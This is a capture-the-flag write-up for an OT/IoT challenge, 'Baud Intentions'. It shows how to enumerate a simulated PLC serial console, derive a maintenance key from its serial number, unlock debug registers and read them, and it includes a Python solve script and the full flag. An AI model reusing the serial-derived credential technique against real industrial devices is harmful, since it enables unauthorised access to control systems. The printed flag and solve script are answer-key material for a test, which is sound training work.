# KPMG CTF 2026: Baud Intentions — OT/IoT Writeup

## Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | Baud Intentions |
| **Category** | OT / IoT / Industrial Control Systems |
| **Target Host** | `http://0.cloud.chals.io:11697` |
| **Protocol** | Web-simulated UART / SCADA Interface |
| **Flag** | `KPMG_CTF{aEX5aKaT2YDwmOronmiRKvr5lbUXHQpcwTtwF_d4lyM}` |

---

## 1. Challenge Overview

The challenge presents an exposed industrial interface simulating a **SCADA-7 / PLCTERM-4** node connected via UART (`115200 8N1`, `/dev/ttyUSB0`). 

The objective is to interact with the device console, elevate access to maintenance mode, unlock protected diagnostic registers, and read the industrial memory buffers containing the flag.

---

## 2. Initial Access & Interface Discovery

Accessing the target in a browser loads a serial console interface:

```text
SCADA-7 :: PLCTERM-4 | UART 115200 8N1 | ttyUSB0
[BOOT] PLCTERM-4 firmware 2.3.1-OT
[BOOT] UART interface ready.
[WARN] Maintenance mode: LOCKED
root@plc4:~$
```

Commands are transmitted over HTTP POST to the `/cmd` endpoint with a JSON body:

```http
POST /cmd HTTP/1.1
Content-Type: application/json

{"command": "help"}
```

Available commands:
- `sysinfo` — Device & firmware metadata
- `status` — PLC operational status & register overview
- `diag [flags]` — Hardware diagnostics
- `mem` — Memory map overview
- `auth <key>` — Session elevation
- `read <register>` — Read register value

---

## 3. Enumeration & Discovery

Running `sysinfo`:

```text
DEVICE  : PLCTERM-4 / SCADA-7 Node
FIRMWARE: 2.3.1-OT (Build 20240307)
CPU     : ARM Cortex-M4 @ 168 MHz
REGISTERS: 0x00 - 0x7F
UART    : 115200 8N1
SERIAL  : SN-7743-ALPHA
MAINT   : LOCKED
```

Running `status` and `mem`:

```text
0x00-0x0F  System control
0x10-0x1F  Sensor inputs
0x20-0x2F  Coil outputs
0x40-0x49  Runtime telemetry
0x4A-0x4C  Reserved
0x4D-0x4F  Maintenance/debug [LOCKED]
0x50-0x7F  User config
```

Attempting to read registers `0x4D` through `0x4F` directly returns:
```text
[READ] 0x4D: ACCESS DENIED - not authenticated.
```

---

## 4. Maintenance Authentication & Diagnostic Unlock

The serial number `SN-7743-ALPHA` provides the key structure for the maintenance format:
```text
auth MAINT-7743
# Output: [AUTH] Key accepted. Session elevated.
```

After authenticating, reading `0x4D` returns:
```text
[READ] 0x4D: LOCKED - run diag sequence first.
```

Inspecting `diag --help`:
```text
Options:
  --verbose    show extended diagnostic output
  --raw        include raw register/debug data
```

Running the full diagnostic sequence:

```text
diag --verbose --raw
```

**Diagnostic Output:**
```text
[DIAG] Running full diagnostic...
[DIAG] 0x01 .. CPU core integrity   PASS
[DIAG] 0x02 .. Flash checksum        PASS
[DIAG] 0x10 .. Pressure register     PASS
[DIAG] 0x12 .. Temp register         PASS
[DIAG] 0x4D .. Debug buffer A        UNLOCKED
[DIAG] 0x4E .. Debug buffer B        UNLOCKED
[DIAG] 0x4F .. Debug buffer C        UNLOCKED
[DIAG] Done. Maintenance/debug range accessible.
```

---

## 5. Reading Registers & Flag Assembly

Reading the three unlocked debug registers:

### Register `0x4D`
```text
Raw: 4B 50 4D 47 5F 43 54 46 7B 61 45 58 35 61 4B 61 54 32
ASCII: KPMG_CTF{aEX5aKaT2
```

### Register `0x4E`
```text
Raw: 59 44 77 6D 4F 72 6F 6E 6D 69 52 4B 76 72 35 6C 62 55
ASCII: YDwmOronmiRKvr5lbU
```

### Register `0x4F`
```text
Raw: 58 48 51 70 63 77 54 74 77 46 5F 64 34 6C 79 4D 7D
ASCII: XHQpcwTtwF_d4lyM}
```

Concatenating the three segments produces the complete flag:
```text
KPMG_CTF{aEX5aKaT2YDwmOronmiRKvr5lbUXHQpcwTtwF_d4lyM}
```

---

## 6. Minimal Solve Script (Python)

```python
import requests

url = "http://0.cloud.chals.io:11697/cmd"

def send(cmd):
    res = requests.post(url, json={"command": cmd}).json()
    return res.get("output", "")

# 1. Elevate session
send("auth MAINT-7743")

# 2. Unlock registers
send("diag --verbose --raw")

# 3. Read registers
part1 = send("read 0x4D")
part2 = send("read 0x4E")
part3 = send("read 0x4F")

print("Part 1:", part1)
print("Part 2:", part2)
print("Part 3:", part3)
```

---

## 7. Final Flag

```text
KPMG_CTF{aEX5aKaT2YDwmOronmiRKvr5lbUXHQpcwTtwF_d4lyM}
```

---

## 8. Key Takeaways
- **Device Identifiers as Credentials:** In legacy OT/embedded systems, default maintenance credentials frequently derive from device serial numbers or manufacturing codes.
- **Diagnostic Mode Risks:** Diagnostic routines (`diag`) can expose raw hardware buffers that should be strictly segmented from external network access.
